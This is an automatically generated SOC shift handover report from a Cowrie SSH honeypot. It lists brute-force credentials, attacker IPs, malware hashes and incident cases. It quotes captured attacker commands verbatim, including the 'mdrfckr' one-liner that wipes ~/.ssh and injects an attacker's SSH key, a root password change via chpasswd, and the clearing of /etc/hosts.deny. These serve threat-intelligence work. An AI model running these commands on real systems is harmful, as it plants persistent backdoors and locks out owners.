# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-09 |
| **Generated At** | 2026-04-09T15:21:46Z |
| **Shift Time** | 15:21 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **44** |
| Confirmed Threats | **38** |
| False Positives Filtered | **6** (13.6%) |
| Unique Attacker IPs | **13** |
| Countries of Origin | **6** |
| High Severity Cases | **7** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **37** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **21** |
| Unique Credential Pairs | **17** |
| Unique Usernames | **13** |
| Unique Passwords | **17** |
| Successful Auth Pairs | **5** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 7 |
| `345gs5662d34` | 3 |
| `ali` | 1 |
| `user1` | 1 |
| `myuser1` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 3 |
| `3245gs5662d34` | 3 |
| `ali1` | 1 |
| `Admin12..` | 1 |
| `Admin123456789!!` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 3 |
| `root` | `3245gs5662d34` | 3 |
| `ali` | `ali1` | 1 |
| `root` | `Admin12..` | 1 |
| `root` | `Admin123456789!!` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Admin12..` | `172.83.83.216` | 2026-04-09T15:06:09 |
| `root` | `3245gs5662d34` | `172.83.83.216` | 2026-04-09T15:06:10 |
| `root` | `Admin123456789!!` | `113.249.103.253` | 2026-04-09T15:07:38 |
| `root` | `testing` | `172.83.83.216` | 2026-04-09T15:11:35 |
| `root` | `Apple123!` | `172.83.83.216` | 2026-04-09T15:20:28 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **44** |
| Sessions with Fingerprint | **1** |
| Unique HASSH Fingerprints | **1** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 36 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 36 | 8 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 36 | 8 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:WvtAQIObhYFO"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `113.249.103.253`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `172.83.83.216`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **13** |
| Unique ASNs | **11** |
| High-Risk ASNs | **8** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS1037` | RBDC, Inc. | 1 | HIGH |
| `AS17858` | LG POWERCOMM | 1 | HIGH |
| `AS29256` | STE PDN Internal AS | 1 | LOW |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | LOW |
| `AS17622` | China Unicom Guangzhou network | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS58519` | Cloud Computing Corporation | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (7)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-2fc702437de2

| Field | Detail |
|---|---|
| **Source IP** | `172.83.83[.]216` |
| **First Seen** | 2026-04-09 15:06 |
| **Last Seen** | 2026-04-09 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 15:06:09` | `cowrie.session.connect` |
| `2026-04-09 15:06:09` | `cowrie.client.version` |
| `2026-04-09 15:06:09` | `cowrie.client.kex` |
| `2026-04-09 15:06:09` | `cowrie.login.success` |
| `2026-04-09 15:06:09` | `cowrie.session.params` |
| `2026-04-09 15:06:09` | `cowrie.command.input` |
| `2026-04-09 15:06:09` | `cowrie.command.failed` |
| `2026-04-09 15:06:09` | `cowrie.log.closed` |
| `2026-04-09 15:06:09` | `cowrie.session.params` |
| `2026-04-09 15:06:09` | `cowrie.command.input` |
| `2026-04-09 15:06:09` | `cowrie.session.file_download` |
| `2026-04-09 15:06:09` | `cowrie.log.closed` |
| `2026-04-09 15:06:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.83.83[.]216` to AbuseIPDB if not already reported
- [ ] Block `172.83.83[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fe2569a791e

| Field | Detail |
|---|---|
| **Source IP** | `172.83.83[.]216` |
| **First Seen** | 2026-04-09 15:06 |
| **Last Seen** | 2026-04-09 15:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 15:06:10` | `cowrie.session.connect` |
| `2026-04-09 15:06:10` | `cowrie.client.version` |
| `2026-04-09 15:06:10` | `cowrie.client.kex` |
| `2026-04-09 15:06:10` | `cowrie.login.success` |
| `2026-04-09 15:06:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.83.83[.]216` to AbuseIPDB if not already reported
- [ ] Block `172.83.83[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-947801abab3e

| Field | Detail |
|---|---|
| **Source IP** | `113.249.103[.]253` |
| **First Seen** | 2026-04-09 15:07 |
| **Last Seen** | 2026-04-09 15:08 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:WvtAQIObhYFO"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 15:07:37` | `cowrie.session.connect` |
| `2026-04-09 15:07:37` | `cowrie.client.version` |
| `2026-04-09 15:07:37` | `cowrie.client.kex` |
| `2026-04-09 15:07:38` | `cowrie.login.success` |
| `2026-04-09 15:07:38` | `cowrie.session.params` |
| `2026-04-09 15:07:38` | `cowrie.command.input` |
| `2026-04-09 15:07:38` | `cowrie.command.failed` |
| `2026-04-09 15:07:38` | `cowrie.log.closed` |
| `2026-04-09 15:07:39` | `cowrie.session.params` |
| `2026-04-09 15:07:39` | `cowrie.command.input` |
| `2026-04-09 15:07:39` | `cowrie.session.file_download` |
| `2026-04-09 15:07:39` | `cowrie.log.closed` |
| `2026-04-09 15:07:52` | `cowrie.session.params` |
| `2026-04-09 15:07:52` | `cowrie.command.input` |
| `2026-04-09 15:07:52` | `cowrie.log.closed` |
| `2026-04-09 15:07:53` | `cowrie.session.params` |
| `2026-04-09 15:07:53` | `cowrie.command.input` |
| `2026-04-09 15:07:53` | `cowrie.log.closed` |
| `2026-04-09 15:07:53` | `cowrie.session.params` |
| `2026-04-09 15:07:53` | `cowrie.command.input` |
| `2026-04-09 15:07:53` | `cowrie.session.file_download` |
| `2026-04-09 15:07:53` | `cowrie.log.closed` |
| `2026-04-09 15:07:54` | `cowrie.session.params` |
| `2026-04-09 15:07:54` | `cowrie.command.input` |
| `2026-04-09 15:07:54` | `cowrie.log.closed` |
| `2026-04-09 15:07:54` | `cowrie.session.params` |
| `2026-04-09 15:07:54` | `cowrie.command.input` |
| `2026-04-09 15:07:54` | `cowrie.log.closed` |
| `2026-04-09 15:07:55` | `cowrie.session.params` |
| `2026-04-09 15:07:55` | `cowrie.command.input` |
| `2026-04-09 15:07:55` | `cowrie.command.input` |
| `2026-04-09 15:07:55` | `cowrie.log.closed` |
| `2026-04-09 15:07:55` | `cowrie.session.params` |
| `2026-04-09 15:07:55` | `cowrie.command.input` |
| `2026-04-09 15:07:55` | `cowrie.log.closed` |
| `2026-04-09 15:07:56` | `cowrie.session.params` |
| `2026-04-09 15:07:56` | `cowrie.command.input` |
| `2026-04-09 15:07:56` | `cowrie.log.closed` |
| `2026-04-09 15:07:56` | `cowrie.session.params` |
| `2026-04-09 15:07:56` | `cowrie.command.input` |
| `2026-04-09 15:07:56` | `cowrie.log.closed` |
| `2026-04-09 15:07:57` | `cowrie.session.params` |
| `2026-04-09 15:07:57` | `cowrie.command.input` |
| `2026-04-09 15:07:57` | `cowrie.log.closed` |
| `2026-04-09 15:07:57` | `cowrie.session.params` |
| `2026-04-09 15:07:57` | `cowrie.command.input` |
| `2026-04-09 15:07:57` | `cowrie.log.closed` |
| `2026-04-09 15:07:58` | `cowrie.session.params` |
| `2026-04-09 15:07:58` | `cowrie.command.input` |
| `2026-04-09 15:07:58` | `cowrie.log.closed` |
| `2026-04-09 15:07:58` | `cowrie.session.params` |
| `2026-04-09 15:07:58` | `cowrie.command.input` |
| `2026-04-09 15:07:59` | `cowrie.log.closed` |
| `2026-04-09 15:07:59` | `cowrie.session.params` |
| `2026-04-09 15:07:59` | `cowrie.command.input` |
| `2026-04-09 15:07:59` | `cowrie.log.closed` |
| `2026-04-09 15:07:59` | `cowrie.session.params` |
| `2026-04-09 15:07:59` | `cowrie.command.input` |
| `2026-04-09 15:08:00` | `cowrie.log.closed` |
| `2026-04-09 15:08:00` | `cowrie.session.params` |
| `2026-04-09 15:08:00` | `cowrie.command.input` |
| `2026-04-09 15:08:00` | `cowrie.log.closed` |
| `2026-04-09 15:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.249.103[.]253` to AbuseIPDB if not already reported
- [ ] Block `113.249.103[.]253` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d191844a227

| Field | Detail |
|---|---|
| **Source IP** | `172.83.83[.]216` |
| **First Seen** | 2026-04-09 15:11 |
| **Last Seen** | 2026-04-09 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 15:11:35` | `cowrie.session.connect` |
| `2026-04-09 15:11:35` | `cowrie.client.version` |
| `2026-04-09 15:11:35` | `cowrie.client.kex` |
| `2026-04-09 15:11:35` | `cowrie.login.success` |
| `2026-04-09 15:11:35` | `cowrie.session.params` |
| `2026-04-09 15:11:35` | `cowrie.command.input` |
| `2026-04-09 15:11:35` | `cowrie.command.failed` |
| `2026-04-09 15:11:36` | `cowrie.log.closed` |
| `2026-04-09 15:11:36` | `cowrie.session.params` |
| `2026-04-09 15:11:36` | `cowrie.command.input` |
| `2026-04-09 15:11:36` | `cowrie.session.file_download` |
| `2026-04-09 15:11:36` | `cowrie.log.closed` |
| `2026-04-09 15:11:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.83.83[.]216` to AbuseIPDB if not already reported
- [ ] Block `172.83.83[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4b0eab4dbc8

| Field | Detail |
|---|---|
| **Source IP** | `172.83.83[.]216` |
| **First Seen** | 2026-04-09 15:11 |
| **Last Seen** | 2026-04-09 15:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 15:11:37` | `cowrie.session.connect` |
| `2026-04-09 15:11:37` | `cowrie.client.version` |
| `2026-04-09 15:11:37` | `cowrie.client.kex` |
| `2026-04-09 15:11:37` | `cowrie.login.success` |
| `2026-04-09 15:11:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.83.83[.]216` to AbuseIPDB if not already reported
- [ ] Block `172.83.83[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bee82a82771

| Field | Detail |
|---|---|
| **Source IP** | `172.83.83[.]216` |
| **First Seen** | 2026-04-09 15:20 |
| **Last Seen** | 2026-04-09 15:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 15:20:28` | `cowrie.session.connect` |
| `2026-04-09 15:20:28` | `cowrie.client.version` |
| `2026-04-09 15:20:28` | `cowrie.client.kex` |
| `2026-04-09 15:20:28` | `cowrie.login.success` |
| `2026-04-09 15:20:28` | `cowrie.session.params` |
| `2026-04-09 15:20:28` | `cowrie.command.input` |
| `2026-04-09 15:20:28` | `cowrie.command.failed` |
| `2026-04-09 15:20:28` | `cowrie.log.closed` |
| `2026-04-09 15:20:28` | `cowrie.session.params` |
| `2026-04-09 15:20:28` | `cowrie.command.input` |
| `2026-04-09 15:20:28` | `cowrie.session.file_download` |
| `2026-04-09 15:20:28` | `cowrie.log.closed` |
| `2026-04-09 15:20:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.83.83[.]216` to AbuseIPDB if not already reported
- [ ] Block `172.83.83[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66f68919d495

| Field | Detail |
|---|---|
| **Source IP** | `172.83.83[.]216` |
| **First Seen** | 2026-04-09 15:20 |
| **Last Seen** | 2026-04-09 15:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 15:20:29` | `cowrie.session.connect` |
| `2026-04-09 15:20:29` | `cowrie.client.version` |
| `2026-04-09 15:20:29` | `cowrie.client.kex` |
| `2026-04-09 15:20:29` | `cowrie.login.success` |
| `2026-04-09 15:20:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.83.83[.]216` to AbuseIPDB if not already reported
- [ ] Block `172.83.83[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `172.83.83[.]216` | **10** | 2026-04-09 15:02 | 2026-04-09 15:20 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `113.249.103[.]253` | **8** | 2026-04-09 15:01 | 2026-04-09 15:19 | 10m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `140.246.70[.]45` | **6** | 2026-04-09 15:04 | 2026-04-09 15:19 | 8m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.229.168[.]32` | 1 | 2026-04-09 15:06 | 2026-04-09 15:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.60[.]44` | 1 | 2026-04-09 15:07 | 2026-04-09 15:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.87[.]166` | 1 | 2026-04-09 15:06 | 2026-04-09 15:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.149[.]158` | 1 | 2026-04-09 15:08 | 2026-04-09 15:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.245[.]60` | 1 | 2026-04-09 15:02 | 2026-04-09 15:02 | 12s | 0 | `T1592` | 🟢 LOW |
| `49.174.174[.]10` | 1 | 2026-04-09 14:53 | 2026-04-09 14:54 | 30s | 0 | `T1592` | 🟢 LOW |
| `58.249.156[.]30` | 1 | 2026-04-09 13:22 | 2026-04-09 13:24 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `120.229.168[.]32` | CN | China Mobile Communications Corporation | **100** ⚠️ | 0 |
| `113.249.103[.]253` | CN | CHINANET Chongqing Province Network | **100** ⚠️ | 4 |
| `58.249.156[.]30` | CN | China Unicom Guangdong province network | **100** ⚠️ | 4 |
| `180.76.245[.]60` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
